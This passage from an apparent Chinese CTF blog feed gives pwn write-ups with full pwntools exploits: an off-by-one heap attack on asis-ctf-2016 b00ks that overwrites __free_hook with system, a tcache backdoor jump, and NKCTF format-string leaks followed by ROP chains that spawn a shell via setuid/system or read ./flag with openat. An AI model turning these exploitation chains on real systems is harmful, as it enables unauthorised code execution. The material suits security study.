src="D:\刷题wp\picture\image-20240311215847155.png" alt="image-20240311215847155"></p></li><li><p>不知道为什么泄露出来的book_2_name的地址与libc_base的基地址偏移每次不同</p></li></ul><blockquote><p>更换思路，用unsortedbin来泄露</p></blockquote><ul><li>原本的book2_control的距离+8刚好是可以泄露fd指针的.</li><li>计算得到book4_control块的距离。（这是已经到最后的new,book4之后才用debug看的距离，其实可以提前算，不过麻烦，不如直接看debug减出来距离）</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">0</span>x100 - <span class="hljs-number">0</span>xc0) +p64(<span class="hljs-number">1</span>)+ p64(book2_control + <span class="hljs-number">8</span>)+p64(book4_control+<span class="hljs-number">0</span>x10) +p64(<span class="hljs-number">0</span>xffff)<br></code></pre></td></tr></table></figure><ul><li><p>注意这里：后面一定要加长度，要不然输入不进去，这代表这description的长度</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">free_hook</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">xffff</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>我用的libc直接是glibc中的2.23的，后续把它换成buu的远程就直接能通过</p></blockquote></li></ul><p>总exp:</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./b00ks&#x27;)<br>p=remote(&#x27;node5.buuoj.cn&#x27;,26785)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br><br>def new(name_size,name,des_size,des):<br>    ru(&#x27;Exit&#x27;)<br>    sl(b&#x27;1&#x27;)<br>    ru(&#x27;Enter book name size:&#x27;)<br>    sl(name_size)<br>    ru(&#x27;Enter book name (Max 32 chars):&#x27;)<br>    sl(name)<br>    ru(&#x27;Enter book description size:&#x27;)<br>    sl(des_size)<br>    ru(&#x27;Enter book description:&#x27;)<br>    sl(des)<br><br><br>def dele(ID):<br>    ru(&#x27;Exit&#x27;)<br>    sl(b&#x27;2&#x27;)<br>    sl(ID)<br><br><br>def edit(ID,des):<br>    ru(&#x27;Exit&#x27;)<br>    sl(b&#x27;3&#x27;)<br>    rl()<br>    sl(ID)<br>    ru(&#x27;description&#x27;)<br>    sl(des)<br><br><br>def show():<br>    ru(&#x27;Exit&#x27;)<br>    sl(b&#x27;4&#x27;)<br><br>def change(content):<br>    ru(&#x27;Exit&#x27;)<br>    sl(b&#x27;5&#x27;)<br>    sl(content)<br><br><br>sl(b&#x27;C&#x27;*31+b&#x27;D&#x27;*1)<br>new(b&#x27;140&#x27;,b&#x27;book1&#x27;,b&#x27;140&#x27;,b&#x27;first book&#x27;)<br>show()<br>ru(&#x27;CCCD&#x27;)<br>book1_control = u64(rc(6).ljust(8,b&#x27;\x00&#x27;))<br>book2_control = book1_control + 0x30<br>book4_control = book1_control + 0x450<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">hex</span><span class="hljs-params">(<span class="hljs-variable">book1_control</span>)</span>)</span><br><br>new(b&#x27;512&#x27;,b&#x27;book2&#x27;,b&#x27;512&#x27;,b&#x27;second book&#x27;)<br>new(b&#x27;20&#x27;,b&#x27;/bin/sh\x00&#x27;,b&#x27;20&#x27;,b&#x27;/bin/sh\x00&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>dele(b&#x27;2&#x27;)<br>payload = b&quot;A&quot; * (0x100 - 0xc0) +p64(1)+ p64(book2_control + 8)+p64(book4_control+0x10) +p64(0xffff)<br>edit(b&#x27;1&#x27;, payload)<br>change(b&#x27;C&#x27;*31 + b&#x27;D&#x27;*1)<br>show()<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">offset</span> = 0x7f2da9d56010 - 0x7f2da9600000<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-variable">offset</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">libc</span> = ELF(&#x27;/home/kali/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)<br>libc = ELF(&#x27;/home/kali/Desktop/libc-2.23.so&#x27;)<br>rl()<br>rl()<br>p.recv(6)<br>libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 88 - 0x10 -(0x7f5b3ddc4b10-0x7f5b3da00000)<br>print(hex(libc_base))<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;]<br>free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]<br><br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">edit</span><span class="hljs-params">(<span class="hljs-variable">b</span>&#x27;1&#x27;,<span class="hljs-keyword">p64</span><span class="hljs-params">(<span class="hljs-variable">bin_sh</span>)</span><span class="hljs-operator">+</span><span class="hljs-keyword">p64</span><span class="hljs-params">(<span class="hljs-variable">free_hook</span>)</span>)</span><br>new(b&#x27;140&#x27;,b&#x27;book4&#x27;,b&#x27;140&#x27;,b&#x27;forth book&#x27;)<br>payload = p64(free_hook)+p64(0xffff)<br>edit(b&#x27;1&#x27;,payload)<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>edit(b&#x27;4&#x27;,p64(system_addr))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>dele(b&#x27;3&#x27;)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>十分感谢师傅们的详细博客–参考博客：</p><p>[<a href="https://blog.csdn.net/Tokameine/article/details/120256944">Asis CTF 2016] b00ks —— Off-By-One笔记与思考_asis ctf 2016 b00ks-CSDN博客</a></p><p><a href="https://bbs.kanxue.com/thread-246507.htm">Asis 2016 b00ks (off by one利用)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆溢出off-by-one (asis-ctf-2016 b00ks)</title>
    <link href="/2024/10/23/%E4%B8%80%E4%B8%AA%E5%87%BA%E9%A2%98%E4%BA%BA%E7%89%B9%E5%9C%B0%E8%AE%BE%E8%AE%A1%E7%9A%84%E6%80%AA%E6%80%AA%E7%9A%84%E5%A0%86/"/>
    <url>/2024/10/23/%E4%B8%80%E4%B8%AA%E5%87%BA%E9%A2%98%E4%BA%BA%E7%89%B9%E5%9C%B0%E8%AE%BE%E8%AE%A1%E7%9A%84%E6%80%AA%E6%80%AA%E7%9A%84%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h4 id="一个出题人特地设计的怪怪的堆"><a href="#一个出题人特地设计的怪怪的堆" class="headerlink" title="一个出题人特地设计的怪怪的堆"></a>一个出题人特地设计的怪怪的堆</h4><p>利用点：出题人特地设置了可定义的跳转，并且给了后门函数</p><p><img src="D:\刷题wp\picture\image-20240323221856331.png" alt="image-20240323221856331"></p><p>先进入这里，看init_User</p><p><img src="D:\刷题wp\picture\image-20240323221439508.png" alt="image-20240323221439508"></p><ul><li>每次创建一个0x98大小的堆块来记录头信息，参数是0x98，由于堆管理机制，会创建0xa0大小（存在标记位，所以看着是0xa1）</li></ul><p><img src="D:\刷题wp\picture\image-20240323221528336.png" alt="image-20240323221528336"></p><ul><li><p>然后看add_User的malloc_lenth的参数是我们输入的长度</p></li><li><p>点进去malloc_lenth发现，还把原来的长度乘了2<img src="D:\刷题wp\picture\image-20240323221806037.png" alt="image-20240323221806037"></p></li><li><p>以0x90或者0x98都会创建0xa0大小的堆块，所以输入的参数用0x48或者0x4c都可以（0x4c我试了可行）</p><p>第一次创建：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">add(&#x27;kkkk&#x27;,<span class="hljs-number">0</span>x4c,&#x27;a&#x27;*0x28+p64(<span class="hljs-name">backdoor</span>))<br></code></pre></td></tr></table></figure><p>创建出两个0xa0大小的块，然后free掉</p><blockquote><p>这时候有两个free的块，再创建一次，把第一个0xa0的块占掉，第二个也就是我们输入了后门函数的需要留下。为了让它留下，需要使得第二个块的大小大于0xa0，这里我尝试用0x50,乘2为0xa0，需要的大小为0xb0。</p></blockquote></li></ul><p>​</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-string">&#x27;kkkk&#x27;</span>,<span class="hljs-number">0</span>x50,<span class="hljs-string">&#x27;aaaa&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>所以这一次不会使用tcache的0xa0的块，而是直接向下切割出更大的空间。 </p><p><img src="D:\刷题wp\picture\image-20240323222822702.png" alt="image-20240323222822702"></p><p>然后再调用创建块的选项，会使用我们这个在相应位置填有相应后门的块，会使得成功跳转。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NKCTF--pwn--Maimai查分器</title>
    <link href="/2024/10/23/NKCTF--pwn/"/>
    <url>/2024/10/23/NKCTF--pwn/</url>
    
    <content type="html"><![CDATA[<h4 id="NKCTF–pwn–Maimai查分器"><a href="#NKCTF–pwn–Maimai查分器" class="headerlink" title="NKCTF–pwn–Maimai查分器"></a>NKCTF–pwn–Maimai查分器</h4><ol><li><p>Maimai查分器</p><p>保护全开</p><p>存在格式化字符串漏洞</p><p>第一步：先测速率，输入15.0 SSS+ 50次获得最高速率</p><p><img src="D:\刷题wp\picture\image-20240323192113298.png" alt="image-20240323192113298"></p></li></ol><p>​</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf">sl(b&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>for i in range(50):<br>    sl(b&#x27;15.0 SSS+&#x27;)<br></code></pre></td></tr></table></figure><p><img src="D:\刷题wp\picture\image-20240323192610417.png" alt="image-20240323192610417"></p><p>然后利用格式化字符串去泄露，本来想一口气全部泄露的，但是只有8个字节，那就分两次</p><p>然后打ret2libc即可</p><p>本地通了，但是不知道为啥远程通不了</p><p><img src="D:\刷题wp\picture\image-20240323200038228.png" alt="image-20240323200038228"></p><p>怀疑可能远程的内部程序偏移不同，用-1到-8，+1到+8试，结果到+4的时候，欸？（后来发现是第二个payload里的4个A给输进去了）</p><p><img src="D:\刷题wp\picture\image-20240324110518067.png" alt="image-20240324110518067"></p><p>但是没有权限，syscall禁用了open，所以用libc里的openat来读写</p><p><img src="D:\刷题wp\picture\image-20240324122425965.png" alt="image-20240324122425965"></p><p>这里出现了好多问题，因为一次只能read0x80字节，本来尝试泄露返回地址，然后多次回转，结果中间会崩溃。</p><p>转换思路：栈溢出后自行用一个read，设置特别大的字节，由于想用orw嘛，就泄露了栈的地址，同时也可以作为这个read的地址。往栈上写.&#x2F;flag\x00\x00的名字，然后再用read来写orw。将两次的联合到一起。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x30</span>-<span class="hljs-number">8</span>-<span class="hljs-number">8</span>)+<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">canary</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rsi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">stack_addr</span>+<span class="hljs-number">0</span><span class="hljs-variable">x80</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdx_rbx</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x200</span>)*<span class="hljs-number">2</span>+<span class="hljs-title">p64</span>(<span class="hljs-variable">read_addr</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>)</span><br><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">xffffff9c</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rsi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">stack_addr</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdx_rbx</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-title">p64</span>(<span class="hljs-variable">openat_addr</span>)</span><br><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">3</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rsi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">stack_addr</span>+<span class="hljs-number">0</span><span class="hljs-variable">x200</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdx_rbx</span>)+<span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x30</span>)*<span class="hljs-number">2</span>+<span class="hljs-title">p64</span>(<span class="hljs-variable">read_addr</span>)</span><br><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">stack_addr</span>+<span class="hljs-number">0</span><span class="hljs-variable">x200</span>)+<span class="hljs-title">p64</span>(<span class="hljs-variable">puts_addr</span>)</span><br><br></code></pre></td></tr></table></figure><p>虽然但是，这么做真的好麻烦好麻烦好麻烦。另外：突然发现那里又不用+4了？？？（不知道是不是修复了还是我的问题）没加是因为我本地之前正常不用+，然后本地调完忘了改，现在突然发现。。。</p><p>对了，而且openat的参数不知道为什么第一个是0xffffff9c？？？不是这个都不行，关于我怎么知道的呢？</p><p>自己编译了一个看了看:dog:,让gpt给写的用openat打开一个文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">openat</span>(AT_FDCWD, <span class="hljs-string">&quot;./flag&quot;</span>, O_RDONLY);<br>    <br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Error opening the file&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 文件已成功打开，可以根据需要进行读取等操作</span><br>    <br>    <span class="hljs-built_in">close</span>(fd); <span class="hljs-comment">// 记得关闭文件描述符</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>调到对应的位置看</p><p><img src="D:\刷题wp\picture\image-20240324123521486.png" alt="image-20240324123521486"></p><p>好吧好吧，总算是做出来一个，没被零封（）（）</p><blockquote><p>出题人用了setuid来获得这个权限，用system获取shell后ls -la 可以看到这个pwn文件被赋予了s权限（可以setuid）</p></blockquote><p><img src="D:\刷题wp\picture\image-20240325193730529.png" alt="image-20240325193730529"></p><p>在setuid之后再system就可以cat flag 了</p><p><img src="D:\刷题wp\picture\image-20240325194023299.png" alt="image-20240325194023299"></p><p>出题人的单独授予题目权限的特殊做法exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.nkctf.yuzhian.com.cn&#x27;</span>,<span class="hljs-number">39213</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    sl(<span class="hljs-string">b&#x27;15.0 SSS+&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>sd(<span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>offset = <span class="hljs-number">0x7f49d9a29d90</span> - <span class="hljs-number">0x7f49d9a00000</span><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>sd(<span class="hljs-string">&#x27;xyyr&#x27;</span>)<br><br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>sd(<span class="hljs-string">b&#x27;%13$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - offset<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>sd(<span class="hljs-string">&#x27;xyyr&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;/home/kali/Desktop/libc-2.35.so&#x27;</span>)<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_ret = libc_base + <span class="hljs-number">0x0000000000029139</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x00000000000904a9</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>setuid_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;setuid&#x27;</span>]<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>sd(<span class="hljs-string">b&#x27;xyyrxyyr&#x27;</span>)<br>rl()<br>payload= <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>)+p64(canary)*<span class="hljs-number">2</span>+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(setuid_addr)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><ul><li><p>另外关于openat，我看别人好像没有给rdi这个特殊的值，但是不知道为什么我按照不给的话输出不出来</p><p><img src="D:\刷题wp\picture\image-20240325195102942.png" alt="image-20240325195102942"></p></li></ul><p>繁杂且麻烦且中间之前步骤有的需要但后面改的思路不需要的地址还存在的麻烦（但是第一的大佬也是这么做的，这个通用）exp：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./pwn&#x27;)<br>p=remote(&#x27;node.nkctf.yuzhian.com.cn&#x27;,39727)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>sl(b&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>for i in range(50):<br>    sl(b&#x27;15.0 SSS+&#x27;)<br>sl(b&#x27;2&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(b&#x27;%7$p&#x27;)<br>offset = 0x7f49d9a29d90 - 0x7f49d9a00000<br>ru(&#x27;0x&#x27;)<br>canary = int(rc(16),16)<br>print(hex(canary))<br>sd(&#x27;xyyr&#x27;)<br><br>sl(b&#x27;2&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(b&#x27;%13$p&#x27;)<br>ru(&#x27;0x&#x27;)<br>libc_base = int(rc(12),16) - offset<br>print(hex(libc_base))<br>sd(&#x27;xyyr&#x27;)<br><br>libc = ELF(&#x27;/home/kali/Desktop/libc-2.35.so&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">system_addr</span> = libc_base + libc.sym[&#x27;system&#x27;]<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">bin_sh</span> = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><br>pop_rdi = libc_base + 0x000000000002a3e5<br>pop_ret = libc_base + 0x0000000000029139<br>pop_rdx_rbx = libc_base + 0x00000000000904a9<br>pop_rsi = libc_base + 0x000000000002be51<br>openat_addr = libc_base + libc.sym[&#x27;openat&#x27;]<br>read_addr = libc_base +libc.sym[&#x27;read&#x27;]<br>puts_addr = libc_base +libc.sym[&#x27;puts&#x27;]<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sl(b&#x27;2&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(b&#x27;%8$p&#x27;)<br>ru(&#x27;0x&#x27;)<br><br>stack_addr = int(rc(12),16)-0x70<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">hex</span><span class="hljs-params">(<span class="hljs-variable">stack</span>)</span>)</span><br>sd(b&#x27;xyyr&#x27;)<br><br>sl(b&#x27;2&#x27;)<br>sd(b&#x27;%9$p&#x27;)<br>ru(&#x27;0x&#x27;)<br>ret_addr = int(rc(12),16)<br>print(hex(ret_addr))<br><br>payload = 